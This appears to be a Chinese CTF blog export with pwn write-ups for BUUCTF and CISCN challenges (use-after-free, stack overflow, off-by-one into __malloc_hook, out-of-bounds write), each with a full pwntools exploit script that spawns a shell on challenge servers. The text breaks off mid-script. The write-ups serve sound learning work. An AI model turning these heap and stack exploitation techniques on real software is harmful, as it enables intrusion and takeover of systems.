<h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><p>常规checksec一下</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132448387.png"><span class="image-caption">image-20210727132448387</span></p>
<p>进入ida看看，其实题目已经有暗示，uaf，所以我们先去delete函数里面看看，</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132528641.png"><span class="image-caption">image-20210727132528641</span></p>
<p>确实存在着uaf，那么该怎么利用？再看看add函数和printf函数</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132617843.png"><span class="image-caption">image-20210727132617843</span></p>
<p>这边的add函数比较奇怪，首先是有次数限制只能申请五个堆块，其次是会申请两个堆块，第一个堆块是固定8字节大小，前4个字节存放一个print_note_content函数的地址，后4个字节是我们可以控制的，申请一个任意大小的堆块</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132832076.png"><span class="image-caption">image-20210727132832076</span></p>
<p>在print函数里面，最后会进行函数调用，就是调用先前在add函数里面保存的print_note_content函数进行打印我们可以控制的堆块里面的内容</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727133015119.png"><span class="image-caption">image-20210727133015119</span></p>
<p>最后就是还存在一个后门函数</p>
<p>思路：一开始是觉得没有edit这类的函数，可能是要制造堆块重叠，把后门函数劫持到malloc_hook里面去，还以为5个会够，但是一个泄露libc基址，再一个申请fastchunk进行double free，然后还需要申请四次，超过次数了</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727135534549.png"><span class="image-caption">image-20210727135534549</span></p>
<p>这是double free的fastbin上的情况，因为free也是两个，所以直接进行两次操作直接就可以构造出A-B-A</p>
<p>所以换一种方法：利用那个函数调用，想办法把进行调用的堆块变成是我们可以控制的那个堆块，把内容改成后门函数，那么就可以getshell了！</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727140624461.png"><span class="image-caption">image-20210727140624461</span></p>
<p>像这样，我们可以控制的堆块申请一个比0x8大的堆块，那么我们就不会申请走，而固定申请大小为0x8的堆块就会申请走一个，此时我们，如果再申请0x8的堆块，就会进行更换了，我们申请到的就是之前程序的固定堆块，最后printf一下，就getshell了！</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727141018340.png"><span class="image-caption">image-20210727141018340</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26333</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,p32(shell_addr))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="picoctf-2018-buffer"><a href="#picoctf-2018-buffer" class="headerlink" title="picoctf_2018_buffer"></a>picoctf_2018_buffer</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144721443.png"><span class="image-caption">image-20210728144721443</span></p>
<p>checksec的情况来看以及名字，应该是道栈题目，进入ida看看</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144750715.png"><span class="image-caption">image-20210728144750715</span></p>
<p>漏洞点应该是在这了，存在明显栈溢出</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145612076.png"><span class="image-caption">image-20210728145612076</span></p>
<p>程序本身还蕴含着一个函数，这个函数会读取flag里面的内容，只要通过判断即可打印出flag</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145716640.png"><span class="image-caption">image-20210728145716640</span></p>
<p>而这里的a1，a2就是该函数的参数。</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728150414970.png"><span class="image-caption">image-20210728150414970</span></p>
<p>成功获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28765</span>)<br>win_addr=<span class="hljs-number">0x080485CB</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(win_addr)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0xDEADBEEF</span>)+p32(<span class="hljs-number">0xDEADC0DE</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please enter your string:&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><p>常规checksec一下，保护全开，可能是道堆题了，进入ida看看程序</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728151846042.png"><span class="image-caption">image-20210728151846042</span></p>
<p>漏洞点在于write函数里面</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730125048904.png"><span class="image-caption">image-20210730125048904</span></p>
<p>这里会把我们之前申请堆块时输入的size与现在要写入的size进行比较，如果我们现在写入的size比原来的size大10，就可以多写一个，所以漏洞点是offbyone</p>
<p>泄露libc，因为calloc会清空堆块的数据，所以这边借着溢出，把is_mmap位改为1，就不会被清空数据，借此把libc泄露出来</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730215233503.png"><span class="image-caption">image-20210730215233503</span></p>
<p>然后就利用offbyone修改堆块的size，制造overlop，修改被覆盖的堆块的fd指针，然后把堆块申请到malloc_hook上去</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233057769.png"><span class="image-caption">image-20210730233057769</span></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233446054.png"><span class="image-caption">image-20210730233446054</span></p>
<p>这边我已经成功写进去了，但是没有getshell，四种都没办法getshell，那接下来，就有很多处理方式了</p>
<ul>
<li>转而去修改free_hook函数</li>
<li>利用realloc调整栈帧</li>
<li>house of orange（通杀2.23以及2.24）</li>
</ul>
<p>这边我使用realloc调整栈帧，其他方法后续会更新的（我也不知道后续是多久~）</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002134507.png"><span class="image-caption">image-20210731002134507</span></p>
<p>这边可以看见，并不会为NULL，所以one_gadget条件没有达成，然后看看realloc,会压栈</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002037708.png"><span class="image-caption">image-20210731002037708</span></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002752890.png"><span class="image-caption">image-20210731002752890</span></p>
<p>发现，其实压栈导致的rsp-0x8，已经让one_gadget的条件达成了，所以就不用再去找了</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731001850853.png"><span class="image-caption">image-20210731001850853</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./roarctf_2019_easy_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size+<span class="hljs-number">10</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\x93&#x27;</span>)<br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c4b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>rlh=libc_base+libc.sym[<span class="hljs-string">&#x27;&#x27;</span>]<br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0x4526a</span><br>log.success(<span class="hljs-string">&quot;libc base==&gt;0x%x&quot;</span> %libc_base)<br>log.success(<span class="hljs-string">&quot;__malloc_hook==&gt;0x%x&quot;</span> %mlh)<br>log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xd8</span>)<span class="hljs-comment">#2</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#5</span><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(ogg)+p64(realloc)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br><br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x10</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>不安全的unlink</title>
    <url>/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/</url>
    <content><![CDATA[<p>以下知识摘自《CTF竞赛权威指南 Pwn篇》、CTF-Wiki</p>
<h1 id="不安全的unlike"><a href="#不安全的unlike" class="headerlink" title="不安全的unlike"></a>不安全的unlike</h1><h3 id="什么叫unlike"><a href="#什么叫unlike" class="headerlink" title="什么叫unlike"></a>什么叫unlike</h3><p>为了避免堆内存的过度碎片化，当一个堆块（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，则将前面或后面的堆块从bins链取出来，与当前释放堆块合并，这个取出堆块的过程就叫做unlike</p>
<p>基本过程如下图所示</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/unlink_smallbin_intro.png"></p>
]]></content>
      <tags>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn</title>
    <url>/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/</url>
    <content><![CDATA[<h3 id="一、pwny"><a href="#一、pwny" class="headerlink" title="一、pwny"></a>一、pwny</h3><p>先checksec一下</p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/4.png"></p>
<p>保护全开了，进入ida看看代码。</p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/QQ%E5%9B%BE%E7%89%8720210523174951.png"></p>
<p>三个功能，主要看read和write两个，其次注意在循环的顶上有个函数。</p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/QQ%E5%9B%BE%E7%89%8720210523175036.png"></p>
<p>这里面，有一个定义的变量，存放了随机数的文字描述符。这里的变量作为后面两个功能里面的read的第一个参数，所以我们是无法输入数据的。</p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/QQ%E5%9B%BE%E7%89%8720210523175133.png"></p>
<p>进入write函数，这里数组存在越界，可以通过这里修改两次，把之前那个变量修改为0。这里是这么理解的：第一次修改，是把随机数里面的一个数据替换文字描述符，然后在来一次，由于这个随机数不会对应一个打开的文件，所以read不执行，v2仍然是0，就成功修改了。因为这题开启了PIE加上本就有的ASLR，我们要泄露的地址有两个，一个是PIE，另一个是libc</p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/QQ%E5%9B%BE%E7%89%8720210523181332.png"></p>
<p>在read功能里面有个__print_chk，在汇编代码可以看见，第三个参数是可以被栈顶的内容影响，而这是我们可以输入的，所以继续数组越界</p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/QQ%E5%9B%BE%E7%89%8720210523181504.png"></p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/QQ%E5%9B%BE%E7%89%8720210523181627.png"></p>
<p>分别泄露出.bss段上的stdrr,以及data里面存在一个该地址的偏移，可以看出来方向是对了，主题人给的条件。</p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/1.png"></p>
<p>这是计算泄露出的地址距离libc_base的偏移</p>
<p><img src="2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn.assets/3.png"></p>
<p>这是exp最后两步写入的地方，说实话我只猜测到应该是执行exit时候会执行这个地方的东西（类似与malloc_hook），但是我不知道这是怎么找到这地方，以及参数写入的地方也不知道怎么找的</p>
<p>猜测可能是那个_rtld_global这个地方有关，这个重定位装载存放数据的地方</p>
<p>exp1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>libc =ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_s</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_s</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.send(p64(idx))<br>write_s(<span class="hljs-number">0x100</span>)<br>write_s(<span class="hljs-number">0x100</span>)<br>read_s(<span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) -<span class="hljs-number">0x3ec680</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.address)<br>read_s(<span class="hljs-number">0xFFFFFFFFFFFFFFF5</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)的、<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)+<span class="hljs-number">0x58</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(pie)<br>write_s((libc.address+<span class="hljs-number">0x61b968</span> - pie)/<span class="hljs-number">8</span>)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>gdb.attach(p)<br>write_s((libc.address+<span class="hljs-number">0x61bf60</span> - pie)/<span class="hljs-number">8</span>)<br>p.sendline(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二种做法涉及到一个知识点，scanf函数在遇到过长输入时会申请堆。前面在泄漏PIE和libc是一致的，getshell时，让数组越界访问到__malloc_hook那边去，写入one_gadget</p>
<p>exp2:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_con</span>(<span class="hljs-params">idx, con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(con)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.send(con)<br><br><span class="hljs-comment"># fd --&gt; 0</span><br>write(<span class="hljs-number">256</span>)<br>write(<span class="hljs-number">256</span>)<br><br><span class="hljs-comment"># leak libc</span><br>read(p64(<span class="hljs-number">0xfffffffffffffffc</span>))  <span class="hljs-comment"># bss --&gt; stderr</span><br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>libc_info = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stderr: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_info))<br><br><span class="hljs-comment"># leak code addr</span><br>read(p64(<span class="hljs-number">0xfffffffffffffff5</span>))  <span class="hljs-comment"># data --&gt; off_202008</span><br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>code_base = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x202008</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code base: &quot;</span>, <span class="hljs-built_in">hex</span>(code_base))<br><br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>base = libc_info-libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(base)<br>m_hook = base+libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;m_hook: &quot;</span>, <span class="hljs-built_in">hex</span>(m_hook)<br>realloc = base+libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;realloc: &quot;</span>, <span class="hljs-built_in">hex</span>(realloc)<br>oneshot = [<span class="hljs-number">0x4f3d5</span>, <span class="hljs-number">0x4f432</span>, <span class="hljs-number">0x10a41c</span>]<br>oneshot = base+oneshot[<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;oneshot: &quot;</span>, <span class="hljs-built_in">hex</span>(oneshot)<br><br>offset = (m_hook-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span><br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;offset: &quot;</span>, offset<br>write_con(<span class="hljs-built_in">int</span>(offset), p64(realloc+<span class="hljs-number">9</span>))<br>gdb.attach(p)<br>write_con(<span class="hljs-built_in">int</span>(offset-<span class="hljs-number">1</span>), p64(oneshot))<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">0x400</span>)   <span class="hljs-comment"># scanf</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>第三种在栈上进行跳转，这里就不修改和解释了，一个大佬直接复制过来的，就纯粹记录知识点：libc中environ存储了栈上环境变量</p>
<p>exp3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ld_path = <span class="hljs-string">&quot;/home/fanxinli/ctf_go/glibc-2.27-64/lib/ld-2.27.so&quot;</span><br><span class="hljs-comment"># libc_path = &quot;/home/fanxinli/ctf_go/pwn/ciscn/pwny/libc-2.27.so&quot;</span><br><span class="hljs-comment">#   p = remote(&quot;124.71.230.113&quot;, 24425)</span><br>p = process([ld_path, <span class="hljs-string">&quot;./pwny&quot;</span>])<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_con</span>(<span class="hljs-params">idx, con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(con)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.send(con)<br><br><span class="hljs-comment"># fd --&gt; 0</span><br>write(<span class="hljs-number">256</span>)<br>write(<span class="hljs-number">256</span>)<br><br><span class="hljs-comment"># leak libc</span><br>read(p64(<span class="hljs-number">0xfffffffffffffffc</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>libc_info = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stderr: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_info))<br><br><span class="hljs-comment"># leak code addr</span><br>read(p64(<span 